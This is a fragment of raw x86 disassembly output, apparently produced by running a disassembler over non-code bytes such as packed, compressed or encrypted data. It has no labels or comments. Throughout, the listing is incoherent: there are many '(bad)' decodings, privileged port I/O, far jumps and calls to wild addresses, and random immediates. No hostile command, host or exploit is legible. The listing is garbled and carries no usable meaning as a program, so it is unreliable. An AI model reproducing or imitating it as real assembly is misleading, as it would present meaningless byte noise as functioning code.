  425d74:	xor    edx,DWORD PTR [ecx]
  425d76:	xor    ch,dh
  425d78:	ins    DWORD PTR es:[edi],dx
  425d79:	jl     0x425dd4
  425d7b:	mov    esi,0xc2de5cb9
  425d80:	dec    ebx
  425d81:	mov    bl,0x78
  425d83:	out    0x25,al
  425d85:	pop    esp
  425d86:	fisttp QWORD PTR ds:0x3f55f16b
  425d8c:	mov    cl,0xa6
  425d8e:	test   BYTE PTR [ebx-0x45],cl
  425d91:	pop    edi
  425d92:	loope  0x425db4
  425d94:	ds adc al,0x15
  425d97:	iret   
  425d98:	retf   
  425d99:	xchg   ecx,eax
  425d9a:	jmp    0x4e926adb
  425d9f:	inc    esp
  425da0:	jo     0x425db4
  425da2:	jl     0x425dad
  425da4:	xchg   edi,edx
  425da6:	cli    
  425da7:	outs   dx,DWORD PTR ds:[esi]
  425da8:	(bad)  
  425da9:	xchg   ebx,eax
  425daa:	sub    DWORD PTR [ebp+0x76e508d5],ebx
  425db0:	test   DWORD PTR [ecx+0x3d79ba2e],ebp
  425db6:	je     0x425d6c
  425db8:	fcom   DWORD PTR [edx+0x4740312b]
  425dbe:	pop    ebx
  425dbf:	dec    ebx
  425dc0:	retf   0xc8e0
  425dc3:	pextrw esp,(bad),0xc5
  425dc5:	arpl   WORD PTR [eax+0x2b],si
  425dc8:	and    al,dl
  425dca:	pop    edx
  425dcb:	push   eax
  425dcc:	rcr    DWORD PTR [edi],0x88
  425dcf:	shr    BYTE PTR ds:0x4359c215,0xec
  425dd6:	test   al,0xe2
  425dd8:	sub    DWORD PTR [edi],ebp
  425dda:	xor    esp,edi
  425ddc:	(bad)
  425de0:	inc    esp
  425de1:	inc    esp
  425de2:	cld    
  425de3:	not    BYTE PTR [ecx-0x72efe729]
  425de9:	cmp    ebp,DWORD PTR [ecx-0x34a5c06d]
  425def:	les    esp,FWORD PTR [edx+esi*4+0x27220f05]
  425df6:	clc    
  425df7:	out    0x1c,al
  425df9:	pushf  
  425dfa:	adc    DWORD PTR [esi],0x41
  425dfd:	mov    eax,ds:0xdf90c94a
  425e02:	and    eax,0x36ba7256
  425e07:	out    dx,al
  425e08:	and    ax,0xd21
  425e0c:	mov    ebx,0xde3f6f26
  425e11:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e13:	ins    DWORD PTR es:[edi],dx
  425e14:	dec    ecx
  425e15:	fsubr  QWORD PTR [ebp+0x1a]
  425e18:	sbb    ah,0xa1
  425e1b:	push   cs
  425e1c:	out    0x6b,eax
  425e1e:	or     BYTE PTR [ebx+0x6fe16950],0x76
  425e25:	dec    ebx
  425e26:	sbb    eax,0x938c0d3f
  425e2b:	push   cs
  425e2c:	xchg   ebp,eax
  425e2d:	repz xor dl,bl
  425e30:	(bad)  
  425e31:	sub    al,0xe6
  425e33:	das    
  425e34:	sub    ebp,DWORD PTR [edx-0x5c4592ed]
  425e3a:	lock daa 
  425e3c:	mov    edi,0x65acdf97
  425e41:	fisub  DWORD PTR cs:[ecx-0x753e4add]
  425e48:	int    0xbf
  425e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4b:	mov    BYTE PTR [eax],dh
  425e4d:	out    dx,al
  425e4e:	add    DWORD PTR [ebp-0x5e383e44],0x668b1ff9
  425e58:	mov    al,0x1c
  425e5a:	add    dl,ah
  425e5c:	clc    
  425e5d:	jae    0x425df4
  425e5f:	xchg   edi,eax
  425e60:	mov    dh,0x59
  425e62:	cmc    
  425e63:	stc    
  425e64:	sub    DWORD PTR [ebp-0x65],ebx
  425e67:	mov    ?,WORD PTR [edx+ebx*4]
  425e6a:	xchg   ecx,eax
  425e6b:	pop    ds
  425e6c:	cs sub bh,0x5
  425e70:	(bad)  
  425e71:	repz mov dh,0x89
  425e74:	sbb    bh,BYTE PTR [esi+0x7aad9477]
  425e7a:	rcl    BYTE PTR [edi+0x6f],cl
  425e7d:	lock adc bl,dl
  425e80:	(bad)
  425e83:	pop    es
  425e84:	inc    edx
  425e85:	cmp    DWORD PTR [edx-0x12],0x87315bdf
  425e8c:	jg     0x425ed1
  425e8e:	xor    bl,BYTE PTR [esi]
  425e90:	cmp    bl,dh
  425e92:	repnz xor BYTE PTR [edx],ch
  425e95:	dec    ebp
  425e96:	add    ch,cl
  425e98:	dec    edx
  425e99:	in     al,dx
  425e9a:	pop    ds
  425e9b:	pop    ds
  425e9c:	(bad)  
  425e9d:	icebp  
  425e9e:	pop    ebp
  425e9f:	call   0xf8ca:0x49ecd0e7
  425ea6:	cld    
  425ea7:	pop    edi
  425ea8:	gs cmp eax,0xae43141d
  425eae:	inc    esp
  425eaf:	or     ebx,0x69
  425eb2:	jnp    0x425f0e
  425eb4:	outs   dx,DWORD PTR ds:[esi]
  425eb5:	jb     0x425f0b
  425eb7:	xchg   esi,eax
  425eb8:	in     al,0x8f
  425eba:	pop    ebx
  425ebb:	(bad)  [edi]
  425ebd:	pop    ecx
  425ebe:	out    dx,al
  425ebf:	mov    ecx,0xe812fc7b
  425ec4:	adc    al,0x5b
  425ec6:	and    DWORD PTR [ebx-0x64a5ba73],0xfffffff9
  425ecd:	mov    ecx,0x310b19b7
  425ed2:	loopne 0x425eb7
  425ed4:	jmp    0xc68bb1dd
  425ed9:	or     dl,BYTE PTR [ebx]
  425edb:	cdq    
  425edc:	sub    BYTE PTR [ebx+ebp*4+0x46],ah
  425ee0:	jb     0x425eb8
  425ee2:	mov    dl,0x9d
  425ee4:	fimul  DWORD PTR [eax-0xc]
  425ee7:	mov    eax,0x162ae46d
  425eec:	xchg   ebp,eax
  425eed:	sbb    eax,0x1b745771
  425ef2:	div    DWORD PTR [ebx-0x6f6232cf]
  425ef8:	jl     0x425e7e
  425efa:	or     al,BYTE PTR [edi-0x67]
  425efd:	sub    eax,0xb3416ec2
  425f02:	xor    cl,ah
  425f04:	out    0x3a,eax
  425f06:	(bad)  
  425f07:	repz jb 0x425f15
  425f0a:	sbb    ch,bl
  425f0c:	jbe    0x425f57
  425f0e:	aad    0xfe
  425f10:	in     al,dx
  425f11:	pushf  
  425f12:	jecxz  0x425ede
  425f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f15:	jb     0x425ea1
  425f17:	xchg   esi,eax
  425f18:	iret   
  425f19:	pop    esp
  425f1a:	inc    ebx
  425f1b:	xchg   esi,eax
  425f1c:	push   ecx
  425f1d:	xchg   edi,eax
  425f1e:	xchg   ebp,eax
  425f1f:	add    ecx,DWORD PTR [edi]
  425f21:	scas   al,BYTE PTR es:[edi]
  425f22:	mov    cl,0x3b
  425f24:	jmp    0x19753994
  425f29:	inc    ebp
  425f2a:	(bad)  
  425f2b:	adc    DWORD PTR [eax],esi
  425f2d:	cld    
  425f2e:	sbb    DWORD PTR [ebx+ecx*1+0x2f],0x76
  425f33:	les    esi,FWORD PTR [edi-0x4e3bf709]
  425f39:	and    ebx,DWORD PTR [edx+0x5c]
  425f3c:	pop    ebx
  425f3d:	xchg   esi,eax
  425f3e:	lods   al,BYTE PTR ds:[esi]
  425f3f:	inc    ecx
  425f40:	gs shl ecx,1
  425f43:	cmp    al,0x2d
  425f45:	mov    ds:0xb3d83762,al
  425f4a:	xchg   dh,cl
  425f4c:	sub    eax,0xacfca889
  425f51:	(bad)  
  425f52:	sar    BYTE PTR [eax+eax*4-0x3b218e3a],1
  425f59:	mov    edi,0x41caa2a1
  425f5e:	xlat   BYTE PTR ds:[ebx]
  425f5f:	popa   
  425f60:	popa   
  425f61:	es hlt 
  425f63:	or     eax,0xf28f4a54
  425f68:	dec    eax
  425f69:	loop   0x425f96
  425f6b:	xchg   esi,eax
  425f6c:	sbb    al,0x5f
  425f6e:	inc    esp
  425f6f:	cwde   
  425f70:	ss cs add al,ah
  425f74:	mov    dh,0xdf
  425f76:	ror    DWORD PTR [edi],cl
  425f78:	neg    DWORD PTR [ecx]
  425f7a:	cmp    ch,0x31
  425f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f7e:	sbb    dl,BYTE PTR [esi]
  425f80:	stos   DWORD PTR es:[edi],eax
  425f81:	inc    ebp
  425f82:	shl    DWORD PTR [ebx],1
  425f84:	loop   0x425fb7
  425f86:	sub    DWORD PTR [esi],eax
  425f88:	nop
  425f89:	xchg   edi,eax
  425f8a:	les    edx,FWORD PTR fs:[ebx-0x43]
  425f8e:	mov    ebx,0xff7dd042
  425f93:	pusha  
  425f94:	(bad)  
  425f95:	neg    esp
  425f97:	leave  
  425f98:	add    BYTE PTR [ecx*4+0x4b856534],bl
  425f9f:	daa    
  425fa0:	out    0x31,eax
  425fa2:	rcr    BYTE PTR [esp+eax*8],1
  425fa5:	mov    esi,0x60a1f151
  425faa:	adc    al,0xf7
  425fac:	loop   0x425f75
  425fae:	sub    BYTE PTR [ecx],0x99
  425fb1:	inc    esp
  425fb2:	cmp    edx,DWORD PTR gs:[ebp+ecx*1-0x749862fa]
  425fba:	jbe    0x425f83
  425fbc:	or     eax,0x146b0d0f
  425fc1:	inc    edi
  425fc2:	in     al,0xd4
  425fc4:	jg     0x425f49
  425fc6:	icebp  
  425fc7:	jmp    0xc20c340
  425fcc:	add    eax,0x6fb26452
  425fd1:	fiadd  WORD PTR [edi+esi*1+0x5d]
  425fd5:	pop    edi
  425fd6:	ficom  DWORD PTR [eax+0x8]
  425fd9:	add    BYTE PTR [eax],al
  425fdb:	add    BYTE PTR [edx-0x39253b74],cl
  425fe1:	ficomp DWORD PTR [esi+0x2983e7dc]
  425fe7:	mov    WORD PTR [edx+0x1],?
  425fea:	adc    eax,0x1d8637d
  425fef:	add    BYTE PTR [ebp-0x44fffffe],al
  425ff5:	(bad)  
  425ff6:	jno    0x42604e
  425ff8:	shl    DWORD PTR [esi-0x2f],1
  425ffb:	(bad)  
  425ffc:	sbb    DWORD PTR [ebx],eax
  425ffe:	adc    DWORD PTR [ebp+0x7c],ecx
  426001:	dec    edx
  426002:	pop    es
  426003:	adc    eax,eax
  426005:	cmp    ebp,esi
  426007:	sar    bl,cl
  426009:	pusha  
  42600a:	xor    al,0x4b
  42600c:	in     al,dx
  42600d:	imul   edi,DWORD PTR [ebx-0xb],0x19
  426011:	xchg   esi,eax
  426012:	outs   dx,BYTE PTR ds:[esi]
  426013:	pop    edi
  426014:	push   ss
  426015:	aam    0x75
  426017:	pusha  
  426018:	inc    edi
  426019:	add    DWORD PTR [ebx+0x5576748],esp
  42601f:	mov    dl,0x3
  426021:	data16 jb 0x425fab
  426024:	(bad)  
  426026:	loop   0x42606c
  426028:	xor    al,0xc2
  42602a:	push   es
  42602b:	cs sbb cl,bh
  42602e:	and    eax,esp
  426030:	jmp    0x605a:0x37b53ea3
  426037:	(bad)  
  426038:	sub    eax,0x31e978c2
  42603d:	mov    al,ds:0x8d29691e
  426042:	inc    edx
  426043:	sub    esp,DWORD PTR [edi-0x20aff391]
  426049:	dec    edx
  42604a:	jmp    0x8788f4bc
  42604f:	pop    ss
  426050:	cwde   
  426051:	xor    DWORD PTR [eax],ecx
  426053:	out    dx,al
  426054:	iret   
  426055:	add    esi,DWORD PTR es:[esi+0xc637e95]
  42605c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42605d:	jl     0x42609f
  42605f:	push   es
  426060:	popa   
  426061:	bound  edx,QWORD PTR [edx+0x5e749b71]
  426067:	sbb    dh,dl
  426069:	inc    esi
  42606a:	push   ebp
  42606b:	retf   0x2e72
  42606e:	dec    esp
  42606f:	jno    0x4260c7
  426071:	jmp    0x426074
  426073:	retf   0x81c2
  426076:	mov    al,0x74
  426078:	xchg   ebp,eax
  426079:	add    ebp,DWORD PTR [edi+0xc]
  42607c:	in     al,0x68
  42607e:	pop    ss
  42607f:	fptan  
  426081:	aad    0x57
  426083:	xor    edx,DWORD PTR [edi-0x6f410cbf]
  426089:	mov    ah,0xf3
  42608b:	pop    edi
  42608c:	mov    esi,DWORD PTR [esi+0x46b8eee3]
  426092:	mov    eax,ecx
  426094:	add    edx,DWORD PTR [edx]
  426096:	scas   al,BYTE PTR es:[edi]
  426097:	pop    esi
  426098:	jmp    0x4260e7
  42609a:	sbb    cl,cl
  42609c:	es pop ebp
  42609e:	xor    DWORD PTR [edx+edx*4],edi
  4260a1:	xor    bh,BYTE PTR [ebp-0x2bc3053d]
  4260a7:	mov    ebp,0x61289751
  4260ac:	shl    dl,0xc5
  4260af:	or     al,0x6e
  4260b1:	mov    ebx,0x9968fe11
  4260b6:	dec    ebx
  4260b7:	js     0x4260b5
  4260b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260ba:	test   al,0x78
  4260bc:	scas   al,BYTE PTR es:[edi]
  4260bd:	add    BYTE PTR [ebx+0x7c],dh
  4260c0:	jne    0x426047
  4260c2:	ror    BYTE PTR [eax+eiz*4+0x15867a9b],cl
  4260c9:	mov    ebx,0x7a046e83
  4260ce:	mov    edx,0x28885ea6
  4260d3:	mov    ebx,0xaa3e6af6
  4260d8:	imul   eax,esp,0xffffffd3
  4260db:	push   ebx
  4260dc:	jecxz  0x4260b7
  4260de:	pop    edx
  4260df:	inc    edi
  4260e0:	xlat   BYTE PTR ds:[ebx]
  4260e1:	fst    DWORD PTR [esi]
  4260e3:	jbe    0x4260e7
  4260e5:	stc    
  4260e6:	xchg   ah,cl
  4260e8:	pop    ebp
  4260e9:	sub    eax,0x7da2285c
  4260ee:	stos   DWORD PTR es:[edi],eax
  4260ef:	adc    BYTE PTR [eax],0x6b
  4260f2:	(bad)  
  4260f4:	jp     0x426142
  4260f6:	cld    
  4260f7:	lahf   
  4260f8:	ss sub eax,0x893996c2
  4260fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260ff:	mov    edi,0x78713830
  426104:	mov    DWORD PTR [edi+esi*8],edx
  426107:	lahf   
  426108:	and    DWORD PTR [edx+esi*4],eax
  42610b:	cwde   
  42610c:	imul   eax,DWORD PTR [edi],0xffffffd6
  42610f:	jge    0x426093
  426111:	add    ecx,eax
  426113:	call   FWORD PTR [ebx+0xd2d03e9]
  426119:	and    eax,0xb748be36
  42611e:	xchg   BYTE PTR [ebx-0x45b8d8e4],bh
  426124:	xlat   BYTE PTR ds:[ebx]
  426125:	jmp    0x6863:0x364c3860
  42612c:	iret   
  42612d:	enter  0xea42,0xb3
  426131:	jle    0x4260c5
  426133:	push   edi
  426134:	gs jae 0x42614f
  426137:	cmp    eax,0xcab4e495
  42613c:	jbe    0x42613a
  42613e:	mov    ds:0x11156d6e,eax
  426143:	sbb    BYTE PTR [esi],dh
  426145:	out    dx,eax
  426146:	in     al,0xcb
  426148:	sahf   
  426149:	imul   edi
  42614b:	sbb    eax,0x7823e7cb
  426150:	je     0x426148
  426152:	xchg   ecx,eax
  426153:	test   cl,ah
  426155:	mov    edi,esp
  426157:	lods   al,BYTE PTR ds:[esi]
  426158:	sbb    eax,0x34af74a4
  42615d:	push   0xfea49722
  426162:	xor    BYTE PTR [ebp+0x1bd9b90c],0xb7
  426169:	pop    ebp
  42616a:	aad    0x9d
  42616c:	ss adc al,0xf1
  42616f:	jmp    0x426151
  426171:	pop    es
  426172:	lahf   
  426173:	xchg   esp,eax
  426174:	xchg   esp,eax
  426175:	push   ss
  426176:	std    
  426177:	in     al,dx
  426178:	enter  0xdf6e,0x4a
  42617c:	inc    eax
  42617d:	lahf   
  42617e:	cld    
  42617f:	ret    0x8d99
  426182:	or     eax,0x57a7cd1b
  426187:	adc    esi,DWORD PTR [eax]
  426189:	dec    esp
  42618a:	sub    eax,0x82673a0f
  42618f:	(bad)  [ecx+0x6edb156c]
  426195:	nop
  426196:	call   0xf76b:0xecaab3d1
  42619d:	pop    ebp
  42619e:	out    dx,al
  42619f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261a0:	xor    bl,al
  4261a2:	cmp    dh,BYTE PTR [ebp-0x2eb05a98]
  4261a8:	imul   DWORD PTR [edi-0x3289b034]
  4261ae:	in     eax,dx
  4261af:	outs   dx,BYTE PTR ds:[esi]
  4261b0:	lock mov ebp,0xca0accef
  4261b6:	aad    0xb7
  4261b8:	adc    eax,0x8f41f9a4
  4261bd:	stos   BYTE PTR es:[edi],al
  4261be:	ins    DWORD PTR es:[edi],dx
  4261bf:	loop   0x426220
  4261c1:	adc    eax,DWORD PTR [eax+0x4eb63df]
  4261c7:	jbe    0x4261f6
  4261c9:	(bad)
  4261cd:	mov    eax,ds:0xcdbb5493
  4261d2:	test   BYTE PTR [ecx-0x7200e7b8],0x4c
  4261d9:	in     eax,0xd4
  4261db:	and    ebp,DWORD PTR [edx+0x6c]
  4261de:	pop    eax
  4261df:	shl    BYTE PTR [edi],1
  4261e1:	cld    
  4261e2:	cs push 0xc679faee
  4261e8:	lods   al,BYTE PTR ds:[esi]
  4261e9:	les    ebp,FWORD PTR [esi-0x4a]
  4261ec:	dec    eax
  4261ed:	add    cl,BYTE PTR ds:0xbccbb227
  4261f3:	fsubr  DWORD PTR [edx+0x5f]
  4261f6:	jmp    0x4261bd
  4261f8:	jecxz  0x42623f
  4261fa:	adc    al,0xdf
  4261fc:	push   eax
  4261fd:	std    
  4261fe:	loopne 0x4261e0
  426200:	and    DWORD PTR [edx+0x376833a6],esp
  426206:	ins    BYTE PTR es:[edi],dx
  426207:	jae    0x42623a
  426209:	dec    edi
  42620a:	lods   eax,DWORD PTR ds:[esi]
  42620b:	sbb    dh,cl
  42620d:	and    DWORD PTR [eax+eiz*4-0x53],eax
  426211:	test   DWORD PTR [ecx],esi
  426213:	mov    es,WORD PTR [esi+0x643f8e1]
  426219:	fadd   QWORD PTR [esi]
  42621b:	lds    eax,FWORD PTR [eax]
  42621d:	test   DWORD PTR [edi+0x3e6e389a],edi
  426223:	sub    eax,0xed328031
  426228:	cmp    dh,dl
  42622a:	adc    eax,eax
  42622c:	pop    eax
  42622d:	iret   
  42622e:	pop    es
  42622f:	addr16 ror ecx,1
  426232:	js     0x4261bb
  426234:	jmp    0xf7be3502
  426239:	call   0xf9ae:0x32453ad3
  426240:	or     eax,0x33819658
  426245:	inc    ebp
  426246:	sub    esp,edx
  426248:	dec    ebx
  426249:	sub    eax,0x2041d41
  42624e:	sbb    eax,0x89b39c80
  426253:	pop    ss
  426254:	inc    edi
  426255:	fwait
  426256:	push   ebx
  426257:	fild   QWORD PTR [esi+0x7786764e]
  42625d:	int3   
  42625e:	mov    esi,0x58362ed0
  426263:	xchg   edx,eax
  426264:	das    
  426265:	call   0xaa557a60
  42626a:	jne    0x42622e
  42626c:	loop   0x4262ac
  42626e:	sar    cl,1
  426270:	xor    al,0x76
  426272:	adc    dl,BYTE PTR [ebx+0x45b83a67]
  426278:	dec    ecx
  426279:	add    BYTE PTR [eax],al
  42627b:	add    BYTE PTR [eax-0x56],al
  42627e:	pop    edx
  42627f:	sbb    bh,dl
  426281:	cli    
  426282:	inc    eax
  426283:	cli    
  426284:	outs   dx,BYTE PTR ds:[esi]
  426285:	jmp    0xbc25:0x83bee400
  42628c:	call   0x8542646b
  426291:	add    al,BYTE PTR [eax]
  426293:	add    bh,bl
  426295:	stc    
  426296:	imul   eax,esi,0x987de3
  42629c:	push   edx
  42629d:	out    dx,eax
  42629e:	sub    al,ch
  4262a0:	xchg   ebp,eax
  4262a1:	je     0x426303
  4262a3:	dec    ebp
  4262a4:	test   edi,ebp
  4262a6:	imul   esp,DWORD PTR [esi],0x46
  4262a9:	dec    edi
  4262aa:	popa   
  4262ab:	(bad)  [eax+0x2d]
  4262ae:	rol    DWORD PTR [eax+0x56abd60d],1
  4262b4:	dec    edx
  4262b5:	int    0xda
  4262b7:	aas    
  4262b8:	stos   DWORD PTR es:[edi],eax
  4262b9:	or     DWORD PTR [edi+ebx*8-0x62],esi
  4262bd:	imul   ecx,DWORD PTR [ebx-0x4670c3a4],0x3b
  4262c4:	mov    edi,0x58776157
  4262c9:	stc    
  4262ca:	outs   dx,DWORD PTR ds:[esi]
  4262cb:	dec    ebp
  4262cc:	in     eax,dx
  4262cd:	jle    0x42625c
  4262cf:	sbb    BYTE PTR [ebp+0x5e566b03],al
  4262d5:	je     0x426290
  4262d7:	xor    al,0x66
  4262d9:	outs   dx,BYTE PTR ds:[esi]
  4262da:	rcl    DWORD PTR ds:0x27abe4b0,cl
  4262e0:	fst    QWORD PTR [eax+eax*4-0x3f]
  4262e4:	out    0x39,eax
  4262e6:	test   eax,ebp
  4262e8:	mov    esi,0x96f06fc8
  4262ed:	(bad)  
  4262ee:	pop    ss
  4262ef:	cld    
  4262f0:	jg     0x4262a1
  4262f2:	mov    ebx,0xe47253dc
  4262f7:	xor    BYTE PTR [ecx+0xc613b1a],bh
  4262fd:	xchg   edi,eax
  4262fe:	mov    esp,0xd88c2d7b
  426303:	fdivr  DWORD PTR [ebx-0x32]
  426306:	xchg   edx,eax
  426307:	ins    BYTE PTR es:[edi],dx
  426308:	test   BYTE PTR [ecx+0x72],dh
  42630b:	adc    bh,0xcf
  42630e:	sub    BYTE PTR [ebx],0x57
  426311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426312:	pop    ebp
  426313:	add    eax,0xd23065de
  426318:	ins    BYTE PTR es:[edi],dx
  426319:	in     eax,dx
  42631a:	mov    dl,0x0
  42631c:	adc    al,0xb7
  42631e:	fmul   QWORD PTR [edx]
  426320:	mov    ch,0x6c
  426322:	xchg   ecx,eax
  426323:	cdq    
  426324:	cmp    al,0x36
  426326:	and    ebx,DWORD PTR [esi+0x100659db]
  42632c:	push   ds
  42632d:	cld    
  42632e:	push   ds
  42632f:	push   esi
  426330:	pushf  
  426331:	leave  
  426332:	pop    esp
  426333:	aas    
  426334:	push   0xf837081c
  426339:	(bad)  
  42633a:	ss dec edi
  42633c:	cdq    
  42633d:	push   edi
  42633e:	sub    al,al
  426340:	cmp    DWORD PTR [edi+0x1c826dad],0xbbdd1faf
  42634a:	test   al,0xe
  42634c:	pop    ebx
  42634d:	push   cs
  42634e:	mov    ebp,esp
  426350:	nop
  426351:	sub    al,0x1e
  426353:	pop    esi
  426354:	cmp    BYTE PTR es:[ecx+0x2c],0xc7
  426359:	out    0xd3,al
  42635b:	adc    eax,0x6bdbaaef
  426360:	std    
  426361:	mov    ebx,0x4724e9d8
  426366:	iret   
  426367:	jecxz  0x4263dc
  426369:	jbe    0x4263e1
  42636b:	outs   dx,DWORD PTR ds:[esi]
  42636c:	mov    WORD PTR [edi-0x501ba2bf],fs
  426372:	addr16 xchg edi,eax
  426374:	xor    al,BYTE PTR [ecx]
  426376:	fisttp DWORD PTR [edx]
  426378:	and    edi,edx
  42637a:	mov    ch,dh
  42637c:	mov    esi,0xe794421e
  426381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426382:	lahf   
  426383:	test   BYTE PTR [ebx-0x6d],dl
  426386:	call   edi
  426388:	mov    edx,0x3a58b33d
  42638d:	push   0x59
  42638f:	push   es
  426390:	in     eax,dx
  426391:	cld    
  426392:	push   esi
  426393:	jnp    0x42639c
  426395:	imul   esi,DWORD PTR [edx+0x156198a3],0xffffff94
  42639c:	int    0xb3
  42639e:	mov    eax,DWORD PTR [ecx+ecx*8]
  4263a1:	lods   eax,DWORD PTR ds:[esi]
  4263a2:	xor    DWORD PTR [esi],0xbb971078
  4263a8:	daa    
  4263a9:	stos   BYTE PTR es:[edi],al
  4263aa:	cld    
  4263ab:	icebp  
  4263ac:	jmp    0x4263c1
  4263ae:	loop   0x4263de
  4263b0:	pop    ecx
  4263b1:	or     dh,BYTE PTR [edi+ebp*1+0x26548e90]
  4263b8:	push   eax
  4263b9:	call   0x8164b352
  4263be:	adc    ch,BYTE PTR [ebx+0x49]
  4263c1:	mov    ah,0xce
  4263c3:	sbb    BYTE PTR [ebx+eiz*8],dh
  4263c6:	aaa    
  4263c7:	xchg   ecx,eax
  4263c8:	imul   ebp,DWORD PTR [ebp-0x22a26d1f],0xffffffc0
  4263cf:	in     al,dx
  4263d0:	inc    ebp
  4263d1:	add    eax,0x72a07ab9
  4263d6:	mov    ebp,0xcec33a2
  4263db:	data16 jp 0x426400
  4263de:	or     eax,DWORD PTR [ebp+edx*2+0x77f1a50]
  4263e5:	out    dx,eax
  4263e6:	nop
  4263e7:	(bad)  
  4263e9:	cmp    DWORD PTR [eax],0xfc9708f7
  4263ef:	add    bl,BYTE PTR [ecx+ebx*2-0x4e]
  4263f3:	xor    al,BYTE PTR [ebp*2-0x39688013]
  4263fa:	outs   dx,DWORD PTR ds:[esi]
  4263fb:	pop    ebp
  4263fc:	and    DWORD PTR [edx],ecx
  4263fe:	enter  0x3451,0xa2
  426402:	leave  
  426403:	mov    ch,0x29
  426405:	pop    ss
  426406:	xchg   ebx,eax
  426407:	cwde   
  426408:	or     al,0x5d
  42640a:	xchg   esi,eax
  42640b:	pop    es
  42640c:	into   
  42640d:	xchg   ebp,eax
  42640e:	jecxz  0x4263fa
  426410:	test   BYTE PTR [edi+ebx*2+0x26801761],al
  426417:	lahf   
  426418:	fcomp  QWORD PTR [ebx]
  42641a:	inc    edi
  42641b:	jbe    0x4263ea
  42641d:	pop    ebx
  42641e:	cmp    eax,0x2629f454
  426423:	outs   dx,DWORD PTR ds:[esi]
  426424:	push   ecx
  426425:	shr    DWORD PTR [ebx-0x189c3222],0x73
  42642c:	ficom  WORD PTR [edx]
  42642e:	in     al,0xa0
  426430:	xchg   ebx,eax
  426431:	push   ds
  426432:	jns    0x4264a3
  426434:	out    0x51,eax
  426436:	aam    0x45
  426438:	(bad)  
  426439:	sub    eax,0x680a83fb
  42643e:	xor    BYTE PTR [si],al
  426441:	(bad)
  426444:	add    BYTE PTR [esi-0x68],dl
  426447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426448:	xor    dl,BYTE PTR [ebx]
  42644a:	sbb    BYTE PTR [edx+0xb],bh
  42644d:	and    ebx,0xffffffe0
  426450:	loope  0x4264a1
  426452:	rcl    BYTE PTR [ebx],cl
  426454:	mov    edi,0xcd197008
  426459:	shr    BYTE PTR [ecx],0xc1
  42645c:	add    ebx,eax
  42645e:	sbb    al,BYTE PTR [edx+0x22]
  426461:	jge    0x426459
  426463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426464:	test   al,0x8c
  426466:	shl    DWORD PTR [edi],cl
  426468:	call   0xe0b6:0x54efe866
  42646f:	daa    
  426470:	mov    BYTE PTR ds:0x24438630,dh
  426476:	push   0x1c84c646
  42647b:	pop    esp
  42647c:	mov    DWORD PTR [edx+0x3],esp
  42647f:	push   esi
  426480:	mov    DWORD PTR [eax],esp
  426482:	jge    0x4264e5
  426484:	push   eax
  426485:	push   es
  426486:	add    BYTE PTR [ebx+0x1f],bl
  426489:	mov    esi,0xd13341e7
  42648e:	pop    ebp
  42648f:	retf   0x2d93
  426492:	in     al,dx
  426493:	dec    eax
  426494:	and    ah,BYTE PTR [ebp-0x35dd2a9e]
  42649a:	cmp    cl,BYTE PTR [ecx+ebp*2-0x327d542a]
  4264a1:	sub    ebp,edi
  4264a3:	stc    
  4264a4:	test   al,0xe8
  4264a6:	push   0x61
  4264a8:	xchg   edi,eax
  4264a9:	sbb    eax,0x7b82090b
  4264ae:	inc    ebx
  4264af:	test   DWORD PTR [ecx-0x2c209396],ebx
  4264b5:	jo     0x426477
  4264b7:	jmp    0x4264e6
  4264b9:	popa   
  4264ba:	ret    0xb355
  4264bd:	and    ebx,esp
  4264bf:	lahf   
  4264c0:	sub    ah,dl
  4264c2:	cld    
  4264c3:	mov    ds:0x2a7629f4,eax
  4264c8:	mov    al,ds:0xb23ab1f7
  4264cd:	aam    0x1a
  4264cf:	imul   esi,DWORD PTR [esi-0x4a],0x62
  4264d3:	xor    BYTE PTR [edx],cl
  4264d5:	stc    
  4264d6:	imul   edi,DWORD PTR [esp+eax*8+0x76183802],0x34fa7f09
  4264e1:	xchg   ebp,eax
  4264e2:	pop    esi
  4264e3:	and    edx,ebx
  4264e5:	pop    ebx
  4264e6:	adc    eax,0x226b11f4
  4264eb:	shr    dl,cl
  4264ed:	cwde   
  4264ee:	jb     0x426478
  4264f0:	iret   
  4264f1:	pop    edi
  4264f2:	(bad)  
  4264f3:	psrld  mm3,mm3
  4264f6:	outs   dx,DWORD PTR ds:[esi]
  4264f7:	jg     0x4264d4
  4264f9:	xor    DWORD PTR [ecx-0x7c565c89],ebp
  4264ff:	xlat   BYTE PTR ds:[ebx]
  426500:	(bad)  
  426501:	popa   
  426502:	jmp    DWORD PTR [esp+ebx*2]
  426505:	out    dx,al
  426506:	aad    0x58
  426508:	push   ebp
  426509:	aam    0x1a
  42650b:	inc    eax
  42650c:	into   
  42650d:	add    cl,al
  42650f:	mov    cl,BYTE PTR [esi+eax*4]
  426512:	xor    eax,0x62089782
  426517:	and    BYTE PTR [ebx+0x0],cl
  42651a:	add    BYTE PTR [eax],al
  42651c:	mov    dh,0xe4
  42651e:	xlat   BYTE PTR ds:[ebx]
  42651f:	push   esp
  426520:	xlat   BYTE PTR ds:[ebx]
  426521:	ja     0x4264da
  426523:	out    0xf3,al
  426525:	ss icebp 
  426527:	mov    esp,0x16eea929
  42652c:	ins    DWORD PTR es:[edi],dx
  42652d:	fld    QWORD PTR [ecx]
  42652f:	add    BYTE PTR [ebp+0x19000002],al
  426535:	dec    esp
  426536:	jns    0x4264f0
  426538:	dec    ebx
  426539:	out    0x4e,al
  42653b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42653d:	fldcw  WORD PTR [eax+0x44b99a64]
  426543:	jle    0x4264e6
  426545:	aaa    
  426546:	lock fs xchg edx,eax
  426549:	add    bl,0xc0
  42654c:	fcmovne st,st(6)
  42654e:	dec    ebp
  42654f:	mov    eax,ds:0x1f55ef15
  426554:	inc    eax
  426555:	(bad)  
